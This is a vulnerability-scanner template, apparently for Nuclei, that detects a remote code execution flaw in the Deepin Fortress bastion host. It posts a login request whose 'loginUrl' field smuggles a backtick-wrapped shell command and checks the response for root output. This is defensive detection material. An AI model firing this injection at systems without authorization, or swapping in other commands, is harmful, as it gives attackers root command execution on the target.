id: deepin-fortress-rce

info:
  name: Deepin Fortress Remote Code Execution
  author: ProjectDiscoveryAI
  severity: critical
  description: |
    This template detects a Remote Code Execution (RCE) vulnerability in Deepin Fortress (堡垒机) by sending a crafted payload.
  tags: rce,deepin,fortress

http:
  - raw:
      - |
        POST /fort/portal_login HTTP/1.1
        Host: {{Hostname}}
        Cookie: FORTSESSIONID={{rand_text_alphanumeric(32)}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
        Accept-Encoding: gzip, deflate, br
        Upgrade-Insecure-Requests: 1
        Sec-Fetch-Dest: document
        Sec-Fetch-Mode: navigate
        Sec-Fetch-Site: none
        Sec-Fetch-User: ?1
        Priority: u=0, i
        Te: trailers
        Connection: close
        Content-Type: application/json
        Content-Length: 94

        {"userName":"Bob", "loginUrl":"`id`", "role":"", "password":"123456789"}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - 'uid=0\\(root\\)'
        part: body
      - type: status
        status:
          - 200
